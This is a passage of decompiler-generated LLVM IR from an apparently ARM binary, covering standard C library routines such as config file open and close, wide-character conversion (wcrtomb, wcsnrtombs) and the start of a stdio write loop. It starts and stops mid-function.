  %v0_15a3c = load i32, i32* @r4, align 4
  %v2_15a3c = add i32 %v0_15a3c, %v2_15a38
  store i32 %v2_15a3c, i32* @r4, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a40:                               ; preds = %bb73, %dec_label_pc_15a30
  %v0_15a44 = phi i32 [ %v2_15a3c, %dec_label_pc_15a30 ], [ %v0_15a44.pre, %bb73 ]
  %v0_15a40 = load i32, i32* @r6, align 4
  %v1_15a40 = add i32 %v0_15a40, 1
  store i32 %v1_15a40, i32* @r6, align 4
  %v1_15a44 = inttoptr i32 %v0_15a44 to i8*
  %v2_15a44 = load i8, i8* %v1_15a44, align 1
  %v3_15a44 = zext i8 %v2_15a44 to i32
  store i32 %v3_15a44, i32* %r2.global-to-local, align 4
  %v2_15a48 = icmp eq i8 %v2_15a44, 0
  store i1 %v2_15a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a48, label %dec_label_pc_15a60, label %dec_label_pc_15a40.dec_label_pc_15a50_crit_edge

dec_label_pc_15a40.dec_label_pc_15a50_crit_edge:  ; preds = %dec_label_pc_15a40
  %v0_15a50.pre = load i32, i32* @r7, align 4
  %v1_15a50 = inttoptr i32 %v0_15a50.pre to i8*
  %v2_15a50 = load i8, i8* %v1_15a50, align 1
  %v3_15a50 = zext i8 %v2_15a50 to i32
  store i32 %v3_15a50, i32* %r3.global-to-local, align 4
  %v9_15a54 = icmp eq i8 %v2_15a50, %v2_15a44
  store i1 %v9_15a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a54, label %dec_label_pc_15a60, label %bb74

bb74:                                             ; preds = %dec_label_pc_15a50.preheader, %dec_label_pc_15a40.dec_label_pc_15a50_crit_edge
  %v2_1599c88 = phi i32 [ %v1_15a40, %dec_label_pc_15a40.dec_label_pc_15a50_crit_edge ], [ %v1_15980, %dec_label_pc_15a50.preheader ]
  %v0_1599c87 = phi i32 [ %v0_15a44, %dec_label_pc_15a40.dec_label_pc_15a50_crit_edge ], [ %v0_15a4413, %dec_label_pc_15a50.preheader ]
  %v2_15a58 = load i32, i32* @sb, align 4
  %v3_15a58 = sub i32 %v2_1599c88, %v2_15a58
  %v5_15a58 = xor i32 %v2_15a58, %v2_1599c88
  %v6_15a58 = xor i32 %v3_15a58, %v2_1599c88
  %v7_15a58 = and i32 %v6_15a58, %v5_15a58
  %v8_15a58 = icmp slt i32 %v7_15a58, 0
  %v9_15a58 = icmp slt i32 %v3_15a58, 0
  %v10_15a58 = icmp eq i32 %v2_1599c88, %v2_15a58
  store i1 %v10_15a58, i1* %cpsr_z.global-to-local, align 1
  %v2_15a5c = xor i1 %v9_15a58, %v8_15a58
  br i1 %v2_15a5c, label %dec_label_pc_1598c, label %dec_label_pc_15a60

dec_label_pc_15a60:                               ; preds = %dec_label_pc_15a50.preheader, %bb74, %dec_label_pc_15a40, %dec_label_pc_15a40.dec_label_pc_15a50_crit_edge, %dec_label_pc_15a44.preheader
  %v0_15a64 = phi i32 [ %v1_15980, %dec_label_pc_15a44.preheader ], [ %v1_15980, %dec_label_pc_15a50.preheader ], [ %v2_1599c88, %bb74 ], [ %v1_15a40, %dec_label_pc_15a40 ], [ %v1_15a40, %dec_label_pc_15a40.dec_label_pc_15a50_crit_edge ]
  store i32 %v3_15784, i32* %r2.global-to-local, align 4
  %v9_15a64 = icmp eq i32 %v0_15a64, %v3_15784
  store i1 %v9_15a64, i1* %cpsr_z.global-to-local, align 1
  %v6_15a68 = icmp slt i32 %v0_15a64, %v3_15784
  br i1 %v6_15a68, label %dec_label_pc_15a6c, label %dec_label_pc_15a78

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a60
  %v0_15a6c = load i32, i32* @r8, align 4
  %v1_15a6c = and i32 %v0_15a6c, 1048576
  %v2_15a6c = icmp eq i32 %v1_15a6c, 0
  store i1 %v2_15a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a6c, label %dec_label_pc_157c4.backedge, label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a6c, %dec_label_pc_1592c, %.thread, %entry
  br label %dec_label_pc_15a78

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a60, %dec_label_pc_15848, %dec_label_pc_15a74
  %v0_15a78 = phi i32 [ %v0_15858, %dec_label_pc_15848 ], [ 0, %dec_label_pc_15a74 ], [ %v0_15a64, %dec_label_pc_15a60 ]
  store i32 %v0_15a78, i32* %r0.global-to-local, align 4
  store i32 %v3_15760, i32* @r4, align 4
  store i32 %v6_15760, i32* @r5, align 4
  store i32 %v9_15760, i32* @r6, align 4
  store i32 %v12_15760, i32* @r7, align 4
  store i32 %v15_15760, i32* @r8, align 4
  store i32 %v18_15760, i32* @sb, align 4
  store i32 %v21_15760, i32* @sl, align 4
  store i32 %v24_15760, i32* @fp, align 4
  ret i32 %v0_15a78

; uselistorder directives
  uselistorder i32 %v0_15a78, { 1, 0 }
  uselistorder i32 %v0_15a64, { 0, 2, 1 }
  uselistorder i32 %v3_15a58, { 1, 0 }
  uselistorder i32 %v2_15a58, { 1, 0, 2 }
  uselistorder i32 %v2_1599c88, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_15a54, { 1, 0 }
  uselistorder i32 %v0_15a44.pre, { 0, 2, 1 }
  uselistorder i32 %v5_159d8, { 1, 0, 2, 3 }
  uselistorder i1 %v9_15a5486, { 1, 0 }
  uselistorder i1 %v9_1597c, { 1, 0 }
  uselistorder i32 %v3_15954, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1592c, { 1, 0 }
  uselistorder i1 %v8_15924, { 1, 0 }
  uselistorder i32 %v3_158f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_158e4, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_158cc, { 1, 0, 2 }
  uselistorder i32 %v1_158bc, { 1, 0, 2 }
  uselistorder i32 %v0_158a8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_158a0, { 1, 0 }
  uselistorder i32 %v1_1588c, { 1, 0 }
  uselistorder i32 %v1_15888, { 1, 0 }
  uselistorder i32 %v2_15864, { 1, 0 }
  uselistorder i32 %v1_15848, { 2, 0, 1 }
  uselistorder i32 %v0_15830, { 1, 0 }
  uselistorder i32 %v1_15820, { 0, 2, 1 }
  uselistorder i1 %v2_15950, { 1, 0, 2, 3 }
  uselistorder i32 %v1_157ac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_157a0, { 2, 1, 0 }
  uselistorder i32 %v3_15788, { 1, 0 }
  uselistorder i32 %v3_15784, { 2, 1, 0 }
  uselistorder i32 %v1_1577c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 33, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_15a78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a60, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15a40, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159f4, { 1, 0 }
  uselistorder label %dec_label_pc_157c4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1596c, { 1, 0 }
  uselistorder label %dec_label_pc_1592c, { 1, 0 }
  uselistorder label %dec_label_pc_15920, { 0, 2, 1 }
  uselistorder label %dec_label_pc_158e4, { 1, 0 }
  uselistorder label %dec_label_pc_15818, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15a8c = icmp eq i32* %arg1, null
  br i1 %v2_15a8c, label %dec_label_pc_15ab4, label %dec_label_pc_15a94

dec_label_pc_15a94:                               ; preds = %entry
  %v2_15a94 = load i32, i32* %arg1, align 4
  %v1_15a98 = inttoptr i32 %v2_15a94 to i16*
  %v2_15a98 = call i32 @__GI_fclose(i16* %v1_15a98)
  %v0_15a9c = load i32, i32* @r4, align 4
  %v1_15a9c = add i32 %v0_15a9c, 20
  %v2_15a9c = inttoptr i32 %v1_15a9c to i32*
  %v3_15a9c = load i32, i32* %v2_15a9c, align 4
  %v2_15aa0 = icmp eq i32 %v3_15a9c, 0
  br i1 %v2_15aa0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15a94
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15a94, %bb
  store i32 88748, i32* @lr, align 4
  %v1_15aa8 = xor i1 %v2_15aa0, true
  call void @__pseudo_cond_branch(i1 %v1_15aa8, i32 ptrtoint (i32* @global_var_1363c.312 to i32))
  %v0_15aac = load i32, i32* @r4, align 4
  store i32 %v0_15aac, i32* @r0, align 4
  %v0_15ab0 = call i32 @free()
  br label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %entry, %bb6
  %v1_15ab8 = phi i32 [ 0, %entry ], [ %v0_15ab0, %bb6 ]
  ret i32 %v1_15ab8

; uselistorder directives
  uselistorder label %dec_label_pc_15ab4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15ac8 = load i32, i32* @r4, align 4
  store i32 %v3_15ac8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35076), i32* @r1, align 4
  %v0_15ad0 = load i32, i32* @r0, align 4
  %v2_15ad0 = call i32 @__GI_fopen(i32 %v0_15ad0, i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35076))
  store i32 %v2_15ad0, i32* %r0.global-to-local, align 4
  store i32 %v2_15ad0, i32* @r4, align 4
  %v2_15ad4 = icmp eq i32 %v2_15ad0, 0
  br i1 %v2_15ad4, label %bb, label %dec_label_pc_15ae0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15ae0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15ae8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15ae8, i32* %r0.global-to-local, align 4
  %v2_15aec = icmp eq i32 %v2_15ae8, 0
  br i1 %v2_15aec, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15ae0
  %v1_15af0 = load i32, i32* @r4, align 4
  %v3_15af0 = inttoptr i32 %v2_15ae8 to i32*
  store i32 %v1_15af0, i32* %v3_15af0, align 4
  %v1_15af8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15ae0, %bb4
  %v1_15af8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15ae0 ], [ %v1_15af8.pre, %bb4 ]
  %v2_15af4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15af4, i32* @r4, align 4
  ret i32 %v1_15af8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35076), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_15b04 = load i32, i32* @lr, align 4
  %v2_15b08 = icmp eq i32 %arg1, 0
  br i1 %v2_15b08, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_15b10 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_15b38 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_15b24 = phi i32 [ %arg1, %.thread ], [ %v3_15b10, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_15b20 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_15b20, i32* @ip, align 4
  %v2_15b28 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_15b20, i32* %stack_var_-16, align 4
  store i32 %v0_15b38, i32* %stack_var_-12, align 4
  %v5_15b40 = inttoptr i32 %v0_15b24 to i8*
  %v6_15b40 = call i32 @__GI_wcsnrtombs(i8* %v5_15b40, i32 %v2_15b28, i32 1, i32 16, i32 %arg3)
  %v2_15b44 = icmp eq i32 %v6_15b40, 0
  br i1 %v2_15b44, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_15b54 = phi i32 [ %v6_15b40, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_15b04, i32* @lr, align 4
  ret i32 %v1_15b54

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_15b6c = load i32, i32* @r0, align 4
  %v1_15b6c = load i32, i32* @r1, align 4
  %v5_15b6c = inttoptr i32 %v0_15b6c to i8*
  %v6_15b6c = call i32 @__GI_wcsnrtombs(i8* %v5_15b6c, i32 %v1_15b6c, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_15b6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15b7c = load i32, i32* @r4, align 4
  store i32 %v3_15b7c, i32* %stack_var_-12, align 4
  %v10_15b80 = icmp eq i32 %tmp, %arg2
  store i1 %v10_15b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_15b80, label %dec_label_pc_15b98, label %bb

bb:                                               ; preds = %entry
  %v4_15b84 = icmp eq i8* %arg1, null
  store i1 %v4_15b84, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_15b84, label %dec_label_pc_15b98.thread, label %bb39

dec_label_pc_15b98.thread:                        ; preds = %bb
  %v2_15b88 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_15b98:                               ; preds = %entry
  %v2_15b881 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_15b98 = icmp eq i8* %arg1, null
  store i1 %v3_15b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15b98, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15b98
  store i32 %v2_15b881, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_15b98, %dec_label_pc_15b98.thread
  %storemerge20 = phi i32 [ %v2_15b881, %dec_label_pc_15b98 ], [ %v2_15b88, %dec_label_pc_15b98.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_15bf428 = phi i32 [ %v2_15b881, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_15bb0 = load i32, i32* @r3, align 4
  %v3_15bb0 = icmp uge i32 %v0_15bb0, %arg3
  %arg3.v0_15bb0 = select i1 %v3_15bb0, i32 %arg3, i32 %v0_15bb0
  store i32 %arg3.v0_15bb0, i32* %r5.global-to-local, align 4
  %v1_15bbc = inttoptr i32 %arg2 to i32*
  %v2_15bbc = load i32, i32* %v1_15bbc, align 4
  store i32 %v2_15bbc, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_15bb0, i32* %r0.global-to-local, align 4
  %v2_15c0822 = icmp eq i32 %arg3.v0_15bb0, 0
  store i1 %v2_15c0822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c0822, label %dec_label_pc_15c10, label %dec_label_pc_15bc8

dec_label_pc_15bc8:                               ; preds = %.thread14.thread, %dec_label_pc_15c00.dec_label_pc_15bc8_crit_edge
  %v2_15bf4 = phi i32 [ %v2_15c00, %dec_label_pc_15c00.dec_label_pc_15bc8_crit_edge ], [ %v2_15bf428, %.thread14.thread ]
  %v0_15bd4 = phi i32 [ %v0_15bc8.pre, %dec_label_pc_15c00.dec_label_pc_15bc8_crit_edge ], [ %v2_15bbc, %.thread14.thread ]
  %v1_15bc8 = inttoptr i32 %v0_15bd4 to i32*
  %v2_15bc8 = load i32, i32* %v1_15bc8, align 4
  %v7_15bcc = icmp eq i32 %v2_15bc8, 127
  store i1 %v7_15bcc, i1* %cpsr_z.global-to-local, align 1
  %v1_15bd0 = urem i32 %v2_15bc8, 256
  store i32 %v1_15bd0, i32* @ip, align 4
  %v1_15bd4 = add i32 %v0_15bd4, 4
  store i32 %v1_15bd4, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_15bc8, 128
  br i1 %tmp45, label %dec_label_pc_15bf0, label %dec_label_pc_15bdc

dec_label_pc_15bdc:                               ; preds = %dec_label_pc_15bc8
  %v0_15bdc = call i32 @__GI___errno_location()
  store i32 %v0_15bdc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15be8 = inttoptr i32 %v0_15bdc to i32*
  store i32 84, i32* %v2_15be8, align 4
  %v0_15c1c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c1c

dec_label_pc_15bf0:                               ; preds = %dec_label_pc_15bc8
  %v2_15bf0 = icmp eq i32 %v1_15bd0, 0
  store i1 %v2_15bf0, i1* %cpsr_z.global-to-local, align 1
  %v1_15bf4 = trunc i32 %v2_15bc8 to i8
  %v3_15bf4 = inttoptr i32 %v2_15bf4 to i8*
  store i8 %v1_15bf4, i8* %v3_15bf4, align 1
  %v0_15bf8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15bf8, label %.dec_label_pc_15c10_crit_edge, label %dec_label_pc_15c00

dec_label_pc_15c00:                               ; preds = %dec_label_pc_15bf0
  %v0_15c00 = load i32, i32* %lr.global-to-local, align 4
  %v1_15c00 = load i32, i32* %r4.global-to-local, align 4
  %v2_15c00 = add i32 %v1_15c00, %v0_15c00
  store i32 %v2_15c00, i32* %lr.global-to-local, align 4
  %v0_15c04 = load i32, i32* %r0.global-to-local, align 4
  %v1_15c04 = add i32 %v0_15c04, -1
  store i32 %v1_15c04, i32* %r0.global-to-local, align 4
  %v2_15c08 = icmp eq i32 %v1_15c04, 0
  store i1 %v2_15c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c08, label %dec_label_pc_15c10, label %dec_label_pc_15c00.dec_label_pc_15bc8_crit_edge

dec_label_pc_15c00.dec_label_pc_15bc8_crit_edge:  ; preds = %dec_label_pc_15c00
  %v0_15bc8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15bc8

.dec_label_pc_15c10_crit_edge:                    ; preds = %dec_label_pc_15bf0
  %v1_15bf8 = load i32, i32* @ip, align 4
  store i32 %v1_15bf8, i32* %r2.global-to-local, align 4
  %v0_15c10.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15c10

dec_label_pc_15c10:                               ; preds = %dec_label_pc_15c00, %.dec_label_pc_15c10_crit_edge, %.thread14.thread
  %v0_15c10 = phi i32 [ %v0_15c10.pre, %.dec_label_pc_15c10_crit_edge ], [ %v2_15bf428, %.thread14.thread ], [ %v2_15c00, %dec_label_pc_15c00 ]
  %v1_15c10 = load i32, i32* @sp, align 4
  %v9_15c10 = icmp eq i32 %v0_15c10, %v1_15c10
  store i1 %v9_15c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15c10, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15c10
  %v1_15c14 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15c14, i32* %v1_15bbc, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15c10, %bb43
  %v0_15c18 = load i32, i32* %r0.global-to-local, align 4
  %v1_15c18 = load i32, i32* %r5.global-to-local, align 4
  %v2_15c18 = sub i32 %v1_15c18, %v0_15c18
  store i32 %v2_15c18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c1c

dec_label_pc_15c1c:                               ; preds = %dec_label_pc_15bdc, %bb44
  %v0_15c1c = phi i32 [ %v0_15c1c.pre, %dec_label_pc_15bdc ], [ %v2_15c18, %bb44 ]
  store i32 %v0_15c1c, i32* %r0.global-to-local, align 4
  %v2_15c24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15c24, i32* %r4.global-to-local, align 4
  ret i32 %v0_15c1c

; uselistorder directives
  uselistorder i32 %v0_15c1c, { 1, 0 }
  uselistorder i32 %v1_15c04, { 1, 0 }
  uselistorder i32 %v2_15c00, { 0, 2, 1 }
  uselistorder i32 %v1_15bd0, { 1, 0 }
  uselistorder i32 %v2_15bc8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15bf428, { 1, 0 }
  uselistorder i32 %v2_15b881, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 5, 6, 1, 3, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c1c, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_15c10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15bc8, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15c2c = load i32, i32* @r4, align 4
  store i32 %v3_15c2c, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15c442 = icmp eq i32 %arg3, 0
  store i1 %v2_15c442, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c442, label %dec_label_pc_15cd4, label %dec_label_pc_15c4c

dec_label_pc_15c44thread-pre-split:               ; preds = %dec_label_pc_15c4c
  %v3_15c64 = load i32, i32* %r6.global-to-local, align 4
  %v5_15c64 = add i32 %v3_15c64, %v3_15c5c
  store i32 %v5_15c64, i32* %r6.global-to-local, align 4
  %v4_15c68 = load i32, i32* %r5.global-to-local, align 4
  %v5_15c68 = sub i32 %v4_15c68, %v3_15c5c
  store i32 %v5_15c68, i32* %r5.global-to-local, align 4
  %v2_15c44 = icmp eq i32 %v5_15c68, 0
  store i1 %v2_15c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c44, label %dec_label_pc_15c44.dec_label_pc_15cd4.loopexit_crit_edge, label %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge

dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge: ; preds = %dec_label_pc_15c44thread-pre-split
  %v3_15c4c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15c58.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c4c

dec_label_pc_15c4c:                               ; preds = %entry, %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge
  %v0_15c58 = phi i32 [ %v0_15c58.pre, %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge ], [ %tmp, %entry ]
  %v0_15c54 = phi i32 [ %v5_15c64, %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge ], [ %arg2, %entry ]
  %v3_15c4c = phi i32 [ %v3_15c4c.pre, %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge ], [ 2147483647, %entry ]
  %v0_15c50.in = phi i32 [ %v5_15c68, %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge ], [ %arg3, %entry ]
  %v3_15c50 = phi i32 [ %v5_15c68, %dec_label_pc_15c44thread-pre-split.dec_label_pc_15c4c_crit_edge ], [ %arg3, %entry ]
  %v0_15c50 = icmp slt i32 %v0_15c50.in, 0
  %storemerge = select i1 %v0_15c50, i32 %v3_15c4c, i32 %v3_15c50
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15c54, i32* %r1.global-to-local, align 4
  %v1_15c58 = add i32 %v0_15c58, 4
  %v2_15c58 = inttoptr i32 %v1_15c58 to i32*
  %v3_15c58 = load i32, i32* %v2_15c58, align 4
  %v3_15c5c = call i32 @__GI_write(i32 %v3_15c58, i32 %v0_15c54)
  %v1_15c60 = icmp slt i32 %v3_15c5c, 0
  %v2_15c60 = icmp eq i32 %v3_15c5c, 0
  store i1 %v2_15c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15c60, label %dec_label_pc_15c70, label %dec_label_pc_15c44thread-pre-split

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c4c
  %v0_15c70 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c70 = inttoptr i32 %v0_15c70 to i16*
  %v2_15c70 = load i16, i16* %v1_15c70, align 2
  %v3_15c70 = zext i16 %v2_15c70 to i32
  store i32 %v3_15c70, i32* %r3.global-to-local, align 4
  %v1_15c74 = add i32 %v0_15c70, 8
  store i32 %v1_15c74, i32* %r1.global-to-local, align 4
  %v1_15c78 = inttoptr i32 %v1_15c74 to i32*
  %v2_15c78 = load i32, i32* %v1_15c78, align 4
  store i32 %v2_15c78, i32* %r1.global-to-local, align 4
  %v3_15c78 = add i32 %v0_15c70, 12
  %v4_15c78 = inttoptr i32 %v3_15c78 to i32*
  %v5_15c78 = load i32, i32* %v4_15c78, align 4
  %v1_15c7c = or i32 %v3_15c70, 8
  store i32 %v1_15c7c, i32* %r3.global-to-local, align 4
  %v2_15c80 = sub i32 %v5_15c78, %v2_15c78
  store i32 %v2_15c80, i32* %r2.global-to-local, align 4
  %v9_15c80 = icmp eq i32 %v5_15c78, %v2_15c78
  store i1 %v9_15c80, i1* %cpsr_z.global-to-local, align 1
  %v1_15c84 = trunc i32 %v1_15c7c to i16
  store i16 %v1_15c84, i16* %v1_15c70, align 2
  br i1 %v9_15c80, label %dec_label_pc_15c70.dec_label_pc_15cd0_crit_edge, label %dec_label_pc_15c8c

dec_label_pc_15c70.dec_label_pc_15cd0_crit_edge:  ; preds = %dec_label_pc_15c70
  %v0_15cd0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15c8c:                               ; preds = %dec_label_pc_15c70
  %v0_15c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_15c8c = load i32, i32* %r5.global-to-local, align 4
